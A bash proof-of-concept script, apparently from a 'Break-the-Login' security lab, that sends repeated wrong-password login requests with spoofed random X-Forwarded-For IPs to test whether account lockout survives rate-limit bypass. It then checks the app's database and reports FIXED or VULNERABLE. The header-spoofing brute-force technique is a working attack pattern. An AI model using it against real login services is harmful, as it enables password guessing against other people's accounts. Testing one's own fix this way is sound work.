#!/usr/bin/env bash
# poc/4.3C_bypass_rate_limit_but_lockout_FIXED.sh

set +e
source "$(dirname "$0")/config.sh"

EMAIL="$1"
DB_PATH="$(dirname "$0")/../backend/db/Break-the-Login.db"

if [ -z "$EMAIL" ]; then
  echo "Usage: $0 <existing_email>"
  exit 2
fi

LOGIN_URL="$BASE_URL/login"
OUT_FILE="$OUT_DIR/43_bypass_lockout_$(date +%s).txt"
mkdir -p "$OUT_DIR"
: > "$OUT_FILE"

echo "[4.3] Rate limit bypass + lockout verification (DB)" | tee -a "$OUT_FILE"

# reset cont
"$(dirname "$0")/4.3_unlock_acc.sh" "$EMAIL" "$DB_PATH" 2>/dev/null

echo "[STEP] Attack with IP rotation..." | tee -a "$OUT_FILE"

for i in $(seq 1 15); do
  FAKE_IP="$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"

  code="$(curl -s -o /dev/null -w "%{http_code}" -X POST "$LOGIN_URL" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $FAKE_IP" \
    -d "{\"email\":\"$EMAIL\",\"password\":\"wrong$i\"}")"

  echo "Try $i (IP=$FAKE_IP) -> HTTP $code" | tee -a "$OUT_FILE"

  sleep 0.3
done

echo
echo "[STEP] Check DB..." | tee -a "$OUT_FILE"

RES="$(sqlite3 "$DB_PATH" \
"SELECT failed_logins, locked_until FROM users WHERE email='$EMAIL';")"

FAILED="$(echo "$RES" | cut -d'|' -f1)"
LOCKED="$(echo "$RES" | cut -d'|' -f2)"

echo "DB: failed_logins=$FAILED, locked_until=$LOCKED" | tee -a "$OUT_FILE"

echo
echo "=== VERDICT ===" | tee -a "$OUT_FILE"

if [ "$FAILED" -ge 10 ] && [ -n "$LOCKED" ]; then
  echo "[FIXED] Lockout functioneaza chiar si cu IP rotation" | tee -a "$OUT_FILE"
else
  echo "[VULNERABLE] Lockout NU functioneaza (doar rate limit)" | tee -a "$OUT_FILE"
fi